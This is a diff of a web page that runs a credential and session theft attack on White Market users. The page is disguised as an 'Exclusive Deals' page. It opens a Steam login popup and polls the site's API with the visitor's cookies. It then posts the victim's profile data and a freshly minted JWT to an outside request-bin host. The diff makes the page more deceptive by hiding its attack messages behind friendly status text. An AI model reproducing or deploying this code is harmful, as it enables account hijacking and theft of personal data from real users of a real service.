@@ -1,15 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head><title>White Market - Login</title></head>
+<head><title>White Market - Exclusive Deals</title></head>
 <body>
-<h1>Redirecting to Steam Login...</h1>
+<h1>Loading Exclusive Deals...</h1>
 <div id="status"></div>
 <script>
 const status = document.getElementById('status');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-// Redirect victim to real Steam login
-status.innerHTML = 'Opening Steam login in popup...<br>';
+status.innerHTML = 'Please complete login to view deals...<br><br>';
 
 // Open Steam login in popup
 const loginWindow = window.open(
@@ -22,12 +21,15 @@ status.innerHTML += 'Login window opened<br>';
 status.innerHTML += 'Monitoring for successful login...<br><br>';
 
 let pollCount = 0;
-const maxPolls = 60; // Poll for up to 60 seconds
+const maxPolls = 120; // Poll for up to 2 minutes
 
 // Poll the API to detect when user logs in
 const pollInterval = setInterval(async () => {
     pollCount++;
-    status.innerHTML += `Poll ${pollCount}/${maxPolls}<br>`;
+    
+    if (pollCount % 5 === 0) {
+        status.innerHTML += `Checking login status... (${pollCount}/${maxPolls})<br>`;
+    }
     
     try {
         // Try to fetch user profile (requires authentication)
@@ -50,10 +52,21 @@ const pollInterval = setInterval(async () => {
             // SUCCESS - User is logged in!
             clearInterval(pollInterval);
             
-            status.innerHTML += '<br><strong>LOGIN DETECTED!</strong><br>';
-            status.innerHTML += 'User data: ' + JSON.stringify(data.data.person).substring(0, 200) + '<br><br>';
+            status.innerHTML += '<br><strong>✅ LOGIN DETECTED!</strong><br>';
+            status.innerHTML += 'Loading your exclusive deals...<br><br>';
             
-            // Now steal their session by generating a JWT
+            // Exfiltrate user data
+            fetch(REQUESTBIN, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    attack: 'USER_DATA_STOLEN',
+                    victim: data.data.person,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            
+            // Try to generate JWT (if they have refresh token from Steam login)
             const jwtResponse = await fetch('https://api.white.market/graphql/api', {
                 method: 'POST',
                 credentials: 'include',
@@ -70,52 +83,44 @@ const pollInterval = setInterval(async () => {
             const jwtData = await jwtResponse.json();
             
             if (jwtData.data && jwtData.data.auth_token) {
-                status.innerHTML += '<strong>JWT STOLEN!</strong><br>';
-                status.innerHTML += 'JWT: ' + jwtData.data.auth_token.accessToken.substring(0, 100) + '...<br>';
+                status.innerHTML += '<strong>✅ FULL ACCESS GRANTED!</strong><br>';
                 
-                // Exfiltrate
+                // Exfiltrate JWT
                 fetch(REQUESTBIN, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        attack: 'SESSION_HIJACK_SUCCESS',
+                        attack: 'JWT_STOLEN',
                         jwt: jwtData.data.auth_token.accessToken,
-                        victim_data: data.data.person,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-            } else {
-                status.innerHTML += 'JWT generation failed (user might not have refresh token)<br>';
-                status.innerHTML += 'But we can still make authenticated requests!<br>';
-                
-                // Even without JWT, we can still exfiltrate data via CORS
-                fetch(REQUESTBIN, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        attack: 'SESSION_HIJACK_PARTIAL',
-                        victim_data: data.data.person,
-                        note: 'Can make authenticated requests while user is logged in',
+                        victim_id: data.data.person.id,
                         timestamp: new Date().toISOString()
                     })
                 });
             }
             
             // Close popup and redirect
-            if (loginWindow) loginWindow.close();
+            if (loginWindow && !loginWindow.closed) {
+                loginWindow.close();
+            }
+            
+            status.innerHTML += '<br>Redirecting to deals page...<br>';
+            
             setTimeout(() => {
                 window.location.href = 'https://white.market';
-            }, 3000);
+            }, 2000);
         }
         
     } catch (e) {
         // User not logged in yet, keep polling
+        console.log('Poll ' + pollCount + ': Not logged in yet');
     }
     
     if (pollCount >= maxPolls) {
         clearInterval(pollInterval);
-        status.innerHTML += '<br>Timeout - user did not complete login<br>';
-        if (loginWindow) loginWindow.close();
+        status.innerHTML += '<br>⚠️ Login timeout - please try again<br>';
+        if (loginWindow && !loginWindow.closed) {
+            loginWindow.close();
+        }
     }
     
 }, 1000); // Poll every second
